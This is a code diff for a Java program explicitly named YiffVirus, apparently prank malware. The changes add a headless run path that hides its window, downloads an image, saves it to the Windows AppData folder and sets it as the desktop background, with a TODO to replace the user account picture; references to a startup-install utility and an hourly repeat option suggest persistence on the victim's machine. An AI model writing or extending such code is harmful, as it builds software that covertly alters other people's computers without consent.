@@ -8,10 +8,12 @@ import me.bannock.virus.images.ImageProviderService;
 import me.bannock.virus.images.impl.TestImageProviderService;
 import me.bannock.virus.images.impl.YiffProviderService;
 import me.bannock.virus.utils.StartOnWindowsStartUtils;
+import me.bannock.virus.utils.WindowsUtils;
 
 import javax.swing.JFrame;
 import java.awt.GridLayout;
 import java.awt.HeadlessException;
+import java.awt.event.WindowEvent;
 import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
@@ -20,8 +22,14 @@ import java.util.Timer;
 
 public class YiffVirus extends JFrame implements Runnable {
 
+    static{
+        FlatDarculaLaf.setup();
+    }
+
     private Config config = new Config();
     private final ImageProviderService imageProviderService = new TestImageProviderService();
+
+    public static final YiffVirus INSTANCE = new YiffVirus();
 
     protected static final File HEADLESS_CONFIG_FILE = new File(StartOnWindowsStartUtils.VIRUS_INSTALL_DIR, "msg.json");
 
@@ -43,10 +51,6 @@ public class YiffVirus extends JFrame implements Runnable {
      */
     public static void main(String[] args) {
 
-        // Create virus
-        FlatDarculaLaf.setup();
-        YiffVirus yiffVirus = new YiffVirus();
-
         // Show the gui if the user wants a gui, autoload if the user configured it to autoload
         boolean showGui = true;
         for (String arg : args){
@@ -55,10 +59,10 @@ public class YiffVirus extends JFrame implements Runnable {
                     showGui = false;
                     if (HEADLESS_CONFIG_FILE.exists()) {
                         try {
-                            yiffVirus.setConfig(new Gson().fromJson(Files.readString(HEADLESS_CONFIG_FILE.toPath()), Config.class));
+                            INSTANCE.setConfig(new Gson().fromJson(Files.readString(HEADLESS_CONFIG_FILE.toPath()), Config.class));
                         } catch (IOException ignored) {}
                     }
-                    yiffVirus.run();
+                    INSTANCE.run();
                 }break;
             }
         }
@@ -70,7 +74,7 @@ public class YiffVirus extends JFrame implements Runnable {
 
         // Display gui if wanted by user
         if (showGui)
-            yiffVirus.setVisible(true);
+            INSTANCE.setVisible(true);
 
     }
 
@@ -79,6 +83,26 @@ public class YiffVirus extends JFrame implements Runnable {
      */
     @Override
     public void run() {
+        // If the window is still visible then hide and dispose it
+        if (INSTANCE.isVisible()) {
+            INSTANCE.setVisible(false);
+            INSTANCE.dispose();
+        }
+
+        // Set background
+        if (config.shouldChangeBackground()){
+            File bg = new File(StartOnWindowsStartUtils.WINDOWS_APPDATA_ROAMING, "/back.png");
+            try {
+                Files.write(bg.toPath(),
+                        imageProviderService.fetchBytes(imageProviderService.fetchImages(1).get(0)));
+                WindowsUtils.changeBackground(bg.getAbsolutePath());
+            } catch (IOException ignored) {
+                ignored.printStackTrace();
+            }
+        }
+
+        // TODO: Set default user icon
+        // C:\ProgramData\Microsoft\User Account Pictures
 
         // Repeated hourly if wanted
         if (config.shouldRepeatHourly())
